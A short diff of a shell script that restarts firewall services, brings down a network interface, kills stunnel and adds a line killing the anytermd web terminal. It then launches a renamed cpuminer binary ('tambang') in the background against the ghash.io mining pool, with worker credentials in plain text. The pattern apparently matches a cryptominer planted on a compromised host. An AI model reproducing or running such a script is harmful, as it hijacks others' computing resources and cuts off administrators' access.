@@ -27,5 +27,6 @@ service iptables restart
 service ip6tables restart
 ifdown venet0:1
 killall stunnel
+pkill anytermd
 #RUN my girl :)
 /root/macca/cpuminer/tambang -o stratum+tcp://multi.ghash.io:3333 -O alLi1n.worker151:1234gosok -D -B -R 151
